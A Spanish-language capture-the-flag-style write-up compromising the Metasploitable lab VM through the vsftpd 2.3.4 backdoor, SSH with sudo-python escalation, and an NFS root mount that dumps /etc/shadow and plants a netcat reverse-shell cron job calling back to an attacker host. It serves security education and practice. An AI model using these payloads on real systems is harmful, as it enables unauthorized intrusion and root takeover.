# Introducción

Metasploitable es una máquina virtual vulnerable diseñada específicamente para practicar pruebas de penetración y análisis de seguridad en entornos controlados. Fue creada por Rapid7 como una plataforma educativa que permite a estudiantes y profesionales de ciberseguridad identificar, explotar y comprender distintas vulnerabilidades reales presentes en sistemas y servicios mal configurados.

Esta máquina incluye aplicaciones desactualizadas, configuraciones inseguras y múltiples fallos conocidos, lo que la convierte en un entorno ideal para aprender técnicas de enumeración, explotación y postexplotación sin poner en riesgo sistemas reales. Debido a su naturaleza deliberadamente vulnerable, se recomienda utilizarla únicamente en laboratorios aislados y con fines educativos.

En este Writeup, aprenderemos cómo realizar todos los procedimientos necesarios para comprometer Metasploitable, desde instalar la máquina virtual hasta explotar la mayoría de los servicios activos de la forma más manual posible.

# Instalación
Para la descarga de Metasploitable, accedemos al link para obtener la máquina virtual:
[**Metasploitable - SourceForge**](https://sourceforge.net/projects/metasploitable/)

![1](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/1.png)

Una vez que hayamos descargado la máquina virtual, es momento de instalarla en nuestro hipervirtualizador preferido e iniciarla (para este ejemplo usaré [**VMware**](https://www.vmware.com/)):

Para instalar la máquina virtual, presionamos el botón "Abrir una máquina virtual" y seleccionamos el archivo descargado:

![2](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/2.png)

![3](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/3.png)

A partir de este momento, podemos iniciar Metasploitable y empezar a auditarla a través de nuestra máquina atacante.

# Reconocimiento
 En caso de que no sepamos cuál es la dirección IP de la máquina, podemos usar nmap para escanear la red y distinguir a nuestro objetivo con el siguiente comando (para el ejemplo la red será 192.168.0/24):
 ```bash
nmap -sn 192.168.0/24
```
Ahora que conocemos la IP de la máquina, podemos iniciar a escanear los puertos con nmap (recomiendo el siguiente comando para facilitar futuros procesos):
```bash
nmap -p- IP -oN openPorts.txt
```

![4](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/4.png)

Como podemos ver, hay una gran cantidad de puertos y servicios activos en Metasploitable; por esta razón es una excelente máquina para practicar. 

Ya que sabemos qué puertos están abiertos, vamos a hacer un escaneo exhaustivo para ver exactamente qué servicios (y qué versión de estos) están corriendo y si tienen alguna vulnerabilidad conocida.

> Con el siguiente script podemos copiar de forma automática a nuestro portapapeles todos los puertos abiertos de la máquina, guardados en el archivo openPorts.txt para el escaneo exhaustivo que haremos posteriormente con nmap:
```bash
cat openPorts.txt | grep -E "[1-9]" | head -n -2 | tail -n +5 | awk -F/ '{print $1}' | paste -sd, | xclip -selection clipboard
```
Ahora procedemos a realizar el segundo escaneo con el siguiente comando:
```bash
nmap -p 21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,3632,5432,5900,6000,6667,6697,8009,8180,8787,32966,33785,34219,42886 -sCV -Pn 192.168.5.143 -oN nmap.txt
```
La salida del comando anterior nos proporciona información muy útil sobre los servicios activos, incluyendo posibles vulnerabilidades que podríamos explotar.

# Explotación
# FTP
El escaneo de Nmap nos proporcionó esta información sobre la instancia de FTP activa en la máquina víctima:
```bash
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.5.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
```
La salida anterior nos deja saber que el FTP en ejecución es vsftpd 2.3.4. Esta versión fue publicada con un backdoor que permite obtener una shell inversa en el sistema simplemente iniciando sesión con un nombre de usuario que termine con los caracteres ":)".

Como mencioné en la introducción, todos los ataques redactados aquí se realizarán de forma manual. Esto es con el propósito de realmente entender las vulnerabilidades presentadas y aprender a explotarlas. A continuación, vamos a ver cómo conectarnos a este backdoor paso a paso.

Nos conectamos a la instancia de FTP del objetivo con cualquier nombre de usuario, pero es crucial que termine con ":)", y como contraseña ponemos cualquier cosa, o incluso nada.
```bash
ftp IP
```
![5](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/5.png)

Al iniciar sesión, notamos que la conexión se "paraliza". Esto es porque el backdoor abrió una shell en el puerto 6200 del sistema víctima y está esperando conexiones. Al conectarnos a la shell, ingresamos al sistema como root. Esto es porque el servicio FTP se ejecutaba con permisos del usuario administrador:
```bash
nc IP 6200
```
![6](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/6.png)

Y de esta forma habremos hecho nuestro el sistema de Metasploitable a través de **FTP**.

---
# SSH
El escaneo de Nmap nos proporcionó esta información sobre la instancia de SSH activa en la máquina víctima:
```bash
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
```
La versión de SSH utilizada no es vulnerable, pero podríamos enumerar usuarios a través de [RPC](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page) (el cual está corriendo en el puerto 111) para posteriormente intentar otras vías de ataque mejores dirigidas:
```bash
PORT      STATE SERVICE     VERSION
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      33785/tcp   mountd
|   100005  1,2,3      50499/udp   mountd
|   100021  1,3,4      34219/tcp   nlockmgr
|   100021  1,3,4      53129/udp   nlockmgr
|   100024  1          36253/udp   status
|_  100024  1          42886/tcp   status

```
Para conectarnos a RPC utilizaremos el comando **rpcclient**. Vamos a intentar acceder como invitado (sin credenciales) con el siguiente comando:
```bash
rpcclient -U "" -N IP
```
Luego de loguearnos como invitado, ejecutando el comando `enumdomusers` podremos enumerar los usuarios existentes en el sistema objetivo:
```bash
rpcclient -U "" -N 192.168.5.143

rpcclient $> enumdomusers

user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]
```
Verdaderamente son muchos usuarios, pero entre todos estos existe uno que tiene como contraseña su mismo nombre; este es **msfadmin**.

Ya que tenemos el conjunto de credenciales, podemos conectarnos al sistema a través de SSH:

![7](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/7.png)

> Antes de ejecutar el comando anterior, tuve que ingresar lo siguiente al archivo **/etc/ssh/ssh_config**. Esto es porque el SSH activo en Metasploitable es una versión que utiliza algoritmos obsoletos para la comunicación y mi sistema (y probablemente el tuyo) bloqueó las conexiones de forma predeterminada. 
> ```bash
> Host 192.168.5.143
>       HostKeyAlgorithms +ssh-rsa
>       MACs +hmac-sha1
> ```

Al ejecutar el comando `id` podemos ver que no somos el usuario root, por lo que es momento de escalar privilegios. Listando los comandos ejecutables como root con `sudo -l`, vemos que podemos ejecutar cualquier comando con permisos de administrador. 

![8](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/8.png)

Aunque se puede lograr la escalada de privilegios de formas más sencillas, para este ejemplo usaré Python como vector de PrivEsc. Para esto, ejecutamos una instancia de Python privilegiada con el comando: `sudo /usr/bin/python`.

Dentro de Python importamos la biblioteca `os`, y por último llamamos una terminal con el comando `os.system(/bin/bash)`:

![9](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/9.png)

Y de esta forma habremos hecho nuestro el sistema de Metasploitable a través de **SSH** auxiliándonos de **RPC**.

# NFS
```bash
PORT      STATE SERVICE     VERSION
2049/tcp  open  nfs         2-4 (RPC #100003)
```
Podemos enumerar los recursos que el objetivo está compartiendo a través de NFS con el comando `showmount -e IP`

![10](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/10.png)

Como se puede observar en la salida, Metasploitable está compartiendo todo el sistema a través del directorio raíz. Montar este recurso nos daría acceso a todos los archivos dentro del objetivo.

Para montar el recurso, primero debemos crear una carpeta que sirva como punto de montaje, y posteriormente usar el comando `mount` para montarlo allí:
```bash
mkdir PUNTO_MONTAJE
sudo mount -t IP:RUTA UBICACION_LOCAL
```
![11](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/11.png)

Una vez dentro del sistema, podemos comprobar si el NFS objetivo tiene la opción [no_root_squash](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/security_guide/s2-server-nfs-noroot) habilitada, cosa que nos permitiría actuar como root dentro del recurso compartido, por el simple hecho de ser root en nuestra máquina local. 

Esto lo comprobamos intentando leer el archivo [/etc/shadow](https://linuxize.com/post/etc-shadow-file/) del sistema de Metasploitable:
```bash
sudo cat PUNTO_MONTAJE/etc/shadow

root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::
```
Confirmamos que podemos actuar como root dentro del recurso compartido. Es momento de obtener una shell como el usuario root. Para lograr esto, nos aprovecharemos de los [cronjobs](https://cloud.donweb.com/guia-completa-de-cron-job-en-linux-para-principiantes-en-5-pasos/), para agendar una tarea automática que cree una shell inversa para conectarnos al sistema.

Para lograr esto debemos crear un cronjob dentro del directorio `/etc/cron.d` y escribir el siguiente payload dentro del archivo:
```bash
* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PUERTO> >/tmp/f
```
Y abrimos un socket en escucha en nuestra máquina con netcat, utilizando el puerto que indicamos anteriormente:
```bash
nc -lvnp PUERTO
```
Aquí podemos el ejemplo:
![12](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/12.png)

![13](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/13.png)

Y de esta forma habremos hecho nuestro el sistema de Metasploitable a través de **NFS**.
# UnrealIRCd



